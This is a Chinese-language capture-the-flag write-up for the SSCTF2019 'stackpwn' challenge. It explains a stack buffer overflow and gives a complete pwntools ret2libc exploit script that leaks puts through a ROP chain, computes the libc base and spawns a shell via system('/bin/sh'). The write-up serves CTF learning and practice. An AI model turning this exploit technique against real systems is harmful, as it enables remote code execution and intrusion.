# SSCTF2019 PWN题题解



# SSCTF2019 PWN题题解

## stackpwn

1. 首先file,checsec走一遍，64位程序，动态链接，开了NX

2. IDA直接看，main函数：  

    ![](/img/ssctf/picture/pwn//stackpwn/main.png)
    
3. 进入vuln看一下：

    ![](/img/ssctf/picture/pwn/stackpwn/vuln.png)

    容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。

到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。  
**基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了**。  
### Exp：
```
from pwn import *

context.log_level = 'debug'

p = process('./stackpwn')

offset = 0x18   #0x10+0x8
pop_rdi_ret = 0x0000000000400933  #ROPgadet : rdi
bin_sh = 0x0000000000400954   # address of /bin/sh

elf = ELF("./stackpwn")
libc = elf.libc     # leak libc

payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address
p.recvuntil("instructions...\n")

p.sendline(payload)

#get puts address
puts_addr = u64(p.recv(6).ljust(8,'\x00'))

#get libc address
puts_base = libc.symbols['puts']
libc_base = puts_addr - puts_base

#get system address
sys_addr = libc_base + libc.symbols['system']

#second loop
payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
p.sendline(payload2)
p.interactive()

```

